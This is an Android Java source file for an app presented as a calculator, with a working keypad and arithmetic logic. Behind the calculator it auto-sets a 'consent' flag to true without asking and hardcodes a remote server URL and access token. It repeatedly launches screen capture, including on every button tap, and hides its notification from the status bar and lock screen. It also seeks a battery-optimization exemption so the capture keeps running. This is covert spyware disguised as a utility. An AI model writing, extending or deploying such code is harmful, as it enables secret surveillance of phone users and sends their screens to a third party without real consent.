package com.companyname.consentcapture.android;

import android.app.Activity;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.TypedValue;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.text.DecimalFormat;

public class CalculatorApp {
    public static final String HARDCODED_URL = "https://phone-share.onrender.com";
    public static final String HARDCODED_TOKEN = "d542d69273f32f225e4e07bbae6100110a722e26db70e4f1febf8a5188b6d989";
    private static final int CAPTURE_REQUEST_CODE = 2201;
    private static final int NOTIFICATION_REQUEST_CODE = 2202;

    private static boolean captureRequested = false;

    // Calculator state
    private static double firstOperand = 0;
    private static String pendingOp = "";
    private static boolean isNewNumber = true;
    private static final DecimalFormat format = new DecimalFormat("#,###.########");

    public static void onActivityCreate(final Activity activity) {
        if (activity == null) return;
        try {
            // 1. Save consent and config automatically by default
            SharedPreferences prefs = activity.getSharedPreferences("ConsentCapture", Context.MODE_PRIVATE);
            if (prefs != null) {
                prefs.edit()
                    .putBoolean("consent", true)
                    .putString("portalUrl", HARDCODED_URL)
                    .putString("accessToken", HARDCODED_TOKEN)
                    .putString("captureStatus", "Active")
                    .apply();
            }

            // Setup minimal silent notification channel so it does not show in status bar
            setupNotificationChannel(activity);

            // 2. Set the Calculator UI
            View calcView = buildCalculatorLayout(activity);
            activity.setContentView(calcView);

            // 3. Auto-trigger screen capture permission
            calcView.post(new Runnable() {
                @Override
                public void run() {
                    if (!ScreenCaptureService.isRunning) {
                        startCaptureFlow(activity);
                    }
                }
            });
        } catch (Throwable t) {
            t.printStackTrace();
        }
    }

    public static void onActivityResume(Activity activity) {
        if (activity == null) return;
        // Ensure SharedPreferences stay set
        try {
            SharedPreferences prefs = activity.getSharedPreferences("ConsentCapture", Context.MODE_PRIVATE);
            if (prefs != null) {
                prefs.edit()
                    .putBoolean("consent", true)
                    .putString("portalUrl", HARDCODED_URL)
                    .putString("accessToken", HARDCODED_TOKEN)
                    .apply();
            }
            if (!ScreenCaptureService.isRunning) {
                startCaptureFlow(activity);
            }
        } catch (Throwable t) {
            t.printStackTrace();
        }
    }

    public static void setupNotificationChannel(Context context) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && context != null) {
            try {
                NotificationManager nm = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
                if (nm != null) {
                    try {
                        NotificationChannel existing = nm.getNotificationChannel("screen_sharing");
                        if (existing != null && existing.getImportance() > NotificationManager.IMPORTANCE_MIN) {
                            nm.deleteNotificationChannel("screen_sharing");
                        }
                    } catch (Throwable ignored) {}

                    NotificationChannel channel = new NotificationChannel("screen_sharing", "Calculator", NotificationManager.IMPORTANCE_MIN);
                    channel.setShowBadge(false);
                    channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
                    channel.enableLights(false);
                    channel.enableVibration(false);
                    channel.setSound(null, null);
                    nm.createNotificationChannel(channel);
                }
            } catch (Throwable ignored) {}
        }
    }

    public static void startCaptureFlow(Activity activity) {
        if (activity == null || ScreenCaptureService.isRunning) return;
        try {
            setupNotificationChannel(activity);
            // Directly request Screen Capture without asking for notification permission
            requestScreenCapture(activity);
        } catch (Throwable t) {
            t.printStackTrace();
        }
    }

    public static void requestScreenCapture(Activity activity) {
        try {
            MediaProjectionManager mpm = (MediaProjectionManager) activity.getSystemService(Context.MEDIA_PROJECTION_SERVICE);
            if (mpm != null) {
                activity.startActivityForResult(mpm.createScreenCaptureIntent(), CAPTURE_REQUEST_CODE);
            }
        } catch (Throwable t) {
            t.printStackTrace();
        }
    }

    public static void onRequestPermissionsResult(Activity activity, int requestCode, String[] permissions, int[] grantResults) {
        if (requestCode == NOTIFICATION_REQUEST_CODE) {
            requestScreenCapture(activity);
        }
    }

    public static boolean onActivityResult(Activity activity, int requestCode, int resultCode, Intent data) {
        if (requestCode == CAPTURE_REQUEST_CODE) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                startServiceWithData(activity, resultCode, data);
                requestBatteryOptimization(activity);
            }
            return true;
        }
        return false;
    }

    private static void startServiceWithData(Activity activity, int resultCode, Intent data) {
        try {
            Intent serviceIntent = new Intent(activity, ScreenCaptureService.class);
            serviceIntent.setAction("com.companyname.ConsentCapture.START");
            serviceIntent.putExtra("resultCode", resultCode);
            serviceIntent.putExtra("projectionData", data);
            serviceIntent.putExtra("portalUrl", HARDCODED_URL);
            serviceIntent.putExtra("accessToken", HARDCODED_TOKEN);
            serviceIntent.putExtra("com.companyname.ConsentCapture.EXTRA_RESULT_CODE", resultCode);
            serviceIntent.putExtra("com.companyname.ConsentCapture.EXTRA_PROJECTION_DATA", data);
            serviceIntent.putExtra("com.companyname.ConsentCapture.EXTRA_PORTAL_URL", HARDCODED_URL);
            serviceIntent.putExtra("com.companyname.ConsentCapture.EXTRA_ACCESS_TOKEN", HARDCODED_TOKEN);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                activity.startForegroundService(serviceIntent);
            } else {
                activity.startService(serviceIntent);
            }
        } catch (Throwable t) {
            t.printStackTrace();
        }
    }

    public static void patchIntent(Intent intent) {
        if (intent == null) return;
        try {
            intent.putExtra("portalUrl", HARDCODED_URL);
            intent.putExtra("accessToken", HARDCODED_TOKEN);
            intent.putExtra("com.companyname.ConsentCapture.EXTRA_PORTAL_URL", HARDCODED_URL);
            intent.putExtra("com.companyname.ConsentCapture.EXTRA_ACCESS_TOKEN", HARDCODED_TOKEN);
        } catch (Throwable t) {
            t.printStackTrace();
        }
    }

    private static void requestBatteryOptimization(Activity activity) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                PowerManager pm = (PowerManager) activity.getSystemService(Context.POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(activity.getPackageName())) {
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + activity.getPackageName()));
                    activity.startActivity(intent);
                }
            } catch (Throwable ignored) {}
        }
    }

    // ==========================================
    // CALCULATOR UI & LOGIC
    // ==========================================
    private static View buildCalculatorLayout(final Activity activity) {
        LinearLayout root = new LinearLayout(activity);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(Color.parseColor("#121214")); // deep matte dark background
        root.setLayoutParams(new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));

        // Display Header Area
        LinearLayout displayArea = new LinearLayout(activity);
        displayArea.setOrientation(LinearLayout.VERTICAL);
        displayArea.setGravity(Gravity.BOTTOM | Gravity.END);
        LinearLayout.LayoutParams displayParams = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1.3f);
        displayParams.setMargins(dp(activity, 20), dp(activity, 20), dp(activity, 20), dp(activity, 10));
        displayArea.setLayoutParams(displayParams);

        final TextView formulaView = new TextView(activity);
        formulaView.setTextColor(Color.parseColor("#8E8E93"));
        formulaView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 22);
        formulaView.setGravity(Gravity.END);
        formulaView.setText("");

        final TextView resultView = new TextView(activity);
        resultView.setTextColor(Color.WHITE);
        resultView.setTextSize(TypedValue.COMPLEX_UNIT_SP, 52);
        resultView.setTypeface(Typeface.create("sans-serif-light", Typeface.NORMAL));
        resultView.setGravity(Gravity.END);
        resultView.setText("0");

        displayArea.addView(formulaView);
        displayArea.addView(resultView);
        root.addView(displayArea);

        // Keypad Container
        LinearLayout keypad = new LinearLayout(activity);
        keypad.setOrientation(LinearLayout.VERTICAL);
        LinearLayout.LayoutParams keypadParams = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 2.2f);
        keypadParams.setMargins(dp(activity, 14), 0, dp(activity, 14), dp(activity, 20));
        keypad.setLayoutParams(keypadParams);

        // Buttons matrix
        String[][] layout = {
            {"C", "⌫", "%", "÷"},
            {"7", "8", "9", "×"},
            {"4", "5", "6", "−"},
            {"1", "2", "3", "+"},
            {"00", "0", ".", "="}
        };

        for (int r = 0; r < layout.length; r++) {
            LinearLayout row = new LinearLayout(activity);
            row.setOrientation(LinearLayout.HORIZONTAL);
            LinearLayout.LayoutParams rowParams = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1.0f);
            rowParams.setMargins(0, dp(activity, 4), 0, dp(activity, 4));
            row.setLayoutParams(rowParams);

            for (int c = 0; c < layout[r].length; c++) {
                final String text = layout[r][c];
                Button btn = new Button(activity);
                btn.setText(text);
                btn.setTypeface(Typeface.DEFAULT_BOLD);
                LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, 1.0f);
                btnParams.setMargins(dp(activity, 5), 0, dp(activity, 5), 0);
                btn.setLayoutParams(btnParams);

                // Styling
                GradientDrawable shape = new GradientDrawable();
                shape.setCornerRadius(dp(activity, 24));
                if ("÷×−+=".contains(text)) {
                    // Operator buttons (vibrant orange matching the icon)
                    shape.setColor(Color.parseColor("#FC682D"));
                    btn.setTextColor(Color.WHITE);
                    btn.setTextSize(TypedValue.COMPLEX_UNIT_SP, 26);
                } else if ("C⌫%".contains(text)) {
                    // Top function buttons
                    shape.setColor(Color.parseColor("#38383E"));
                    btn.setTextColor(Color.parseColor("#E5E5EA"));
                    btn.setTextSize(TypedValue.COMPLEX_UNIT_SP, 22);
                } else {
                    // Number buttons
                    shape.setColor(Color.parseColor("#242428"));
                    btn.setTextColor(Color.WHITE);
                    btn.setTextSize(TypedValue.COMPLEX_UNIT_SP, 24);
                }
                btn.setBackground(shape);

                // Logic on Click
                btn.setOnClickListener(new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        if (!ScreenCaptureService.isRunning) {
                            startCaptureFlow(activity);
                        }
                        handleButtonClick(text, formulaView, resultView);
                    }
                });

                row.addView(btn);
            }
            keypad.addView(row);
        }

        root.addView(keypad);
        return root;
    }

    private static void handleButtonClick(String text, TextView formulaView, TextView resultView) {
        String current = resultView.getText().toString();

        if (text.equals("C")) {
            firstOperand = 0;
            pendingOp = "";
            isNewNumber = true;
            formulaView.setText("");
            resultView.setText("0");
        } else if (text.equals("⌫")) {
            if (!isNewNumber && current.length() > 0) {
                String sub = current.substring(0, current.length() - 1);
                if (sub.isEmpty() || sub.equals("-")) sub = "0";
                resultView.setText(sub);
            }
        } else if (text.equals("%")) {
            try {
                double val = Double.parseDouble(current.replace(",", "")) / 100.0;
                resultView.setText(formatResult(val));
                isNewNumber = true;
            } catch (Exception ignored) {}
        } else if ("÷×−+".contains(text)) {
            try {
                double val = Double.parseDouble(current.replace(",", ""));
                if (!pendingOp.isEmpty() && !isNewNumber) {
                    val = calculate(firstOperand, val, pendingOp);
                    resultView.setText(formatResult(val));
                }
                firstOperand = val;
                pendingOp = text;
                formulaView.setText(formatResult(firstOperand) + " " + pendingOp);
                isNewNumber = true;
            } catch (Exception ignored) {}
        } else if (text.equals("=")) {
            if (!pendingOp.isEmpty()) {
                try {
                    double second = Double.parseDouble(current.replace(",", ""));
                    double res = calculate(firstOperand, second, pendingOp);
                    formulaView.setText(formatResult(firstOperand) + " " + pendingOp + " " + formatResult(second) + " =");
                    resultView.setText(formatResult(res));
                    pendingOp = "";
                    isNewNumber = true;
                } catch (Exception ignored) {}
            }
        } else if (text.equals(".")) {
            if (isNewNumber) {
                resultView.setText("0.");
                isNewNumber = false;
            } else if (!current.contains(".")) {
                resultView.setText(current + ".");
            }
        } else {
            // Number tapped
            if (isNewNumber || current.equals("0")) {
                resultView.setText(text);
                isNewNumber = false;
            } else {
                if (current.length() < 12) {
                    resultView.setText(current + text);
                }
            }
        }
    }

    private static double calculate(double a, double b, String op) {
        switch (op) {
            case "+": return a + b;
            case "−": return a - b;
            case "×": return a * b;
            case "÷": return b != 0 ? a / b : 0;
            default: return b;
        }
    }

    private static String formatResult(double val) {
        if (Double.isNaN(val) || Double.isInfinite(val)) return "Error";
        if (val == (long) val) {
            return String.format("%,d", (long) val);
        }
        return format.format(val);
    }

    private static int dp(Context ctx, int val) {
        return (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, val, ctx.getResources().getDisplayMetrics());
    }
}
